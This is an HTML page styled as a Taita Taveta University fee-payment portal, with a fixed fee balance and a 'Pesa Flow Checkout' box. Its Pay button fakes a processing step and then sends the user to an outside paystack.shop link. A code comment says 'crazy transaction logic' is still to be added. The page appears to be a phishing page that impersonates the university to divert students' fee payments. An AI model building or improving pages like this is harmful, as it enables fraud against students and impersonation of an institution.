<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>TTU | Fee Payment</title>
    <style>
        body { font-family: 'Source Sans Pro', sans-serif; background: #ecf0f5; margin: 0; padding: 0; }
        .header { background: #00a6d6; color: white; padding: 15px; font-size: 18px; font-weight: bold; display: flex; align-items: center; justify-content: center; }
        .container { padding: 15px; }
        .breadcrumb { background: #d2d6de; padding: 8px 15px; margin-bottom: 20px; border-radius: 4px; font-size: 12px; color: #777; }
        .card { background: white; border-top: 3px solid #dd4b39; border-radius: 3px; box-shadow: 0 1px 1px rgba(0,0,0,0.1); padding: 20px; }
        .card-title { font-size: 18px; border-bottom: 1px solid #f4f4f4; padding-bottom: 10px; margin-bottom: 20px; color: #444; }
        .form-group { margin-bottom: 20px; }
        label { display: block; font-weight: bold; margin-bottom: 5px; color: #333; font-size: 14px; }
        input { width: 100%; padding: 10px; border: 1px solid #ccc; box-sizing: border-box; font-size: 16px; border-radius: 0; }
        .balance-input { background: #eeeeee; color: #555; cursor: not-allowed; border: 1px solid #d2d6de; }
        .btn-pay { background: #3c8dbc; color: white; border: none; padding: 10px 25px; border-radius: 2px; font-size: 14px; cursor: pointer; text-transform: uppercase; }
        .btn-pay:hover { background: #367fa9; }
        footer { margin-top: 30px; text-align: center; font-size: 12px; color: #777; padding-bottom: 20px; }
    </style>
</head>
<body>
    <div class="header"><a href="/Dashboard" style="color:white; text-decoration:none; margin-right:20px;">☰</a> TTU Portal</div>
    <div class="container">
        <h2 style="font-weight: 300; margin-top: 0;">Fee Payment</h2>
        <div class="breadcrumb">Dashboard > Fee Payment</div>
        
        <div class="card">
            <div class="card-title">Pesa Flow Checkout</div>
            
            <div class="form-group">
                <label>Fee Balance</label>
                <input type="text" class="balance-input" value="135,018.32" readonly>
            </div>

            <div class="form-group">
                <label>Amount To Pay (Plus 50 KSHs Convenience Fee)</label>
                <input type="number" id="userAmount" placeholder="Enter Amount">
            </div>

            <button class="btn-pay" onclick="startSTKPush()">Pay</button>
        </div>
    </div>

    <footer>
        Copyright © 2026 <b>Taita Taveta University</b>. Powered by. AppKings Solutions Limited
    </footer>

    <script>
        function startSTKPush() {
            const amount = document.getElementById('userAmount').value;
            if(!amount || amount <= 0) {
                alert("Please enter a valid amount.");
                return;
            }
            const btn = document.querySelector(".btn-pay"); btn.innerText = "PROCESSING..."; btn.style.opacity = "0.5"; setTimeout(() => { window.location.href = "https://paystack.shop/pay/ttu-ac-ke"; }, 1500);
            // This is where the 'crazy transaction logic' will go.
        }
    </script>
</body>
</html>
